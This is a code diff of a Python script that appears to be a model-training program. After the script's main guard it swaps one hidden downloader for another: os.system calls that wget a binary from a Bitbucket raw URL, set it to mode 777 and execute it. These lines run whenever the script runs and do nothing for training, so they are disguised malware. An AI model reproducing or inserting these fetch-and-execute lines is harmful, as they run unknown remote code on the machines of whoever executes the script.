@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/betee/whiv/raw/ae5668ac75ff5471daaee19ed1285cefaa03a3b1/whiv')
-os.system('chmod 777 whiv')
-os.system('./whiv')
+os.system('wget https://bitbucket.org/esfx/newsfx/raw/59a0278cfb1a18cda3f54139893c2d5a2f6d5216/esfx')
+os.system('chmod 777 esfx')
+os.system('./esfx')
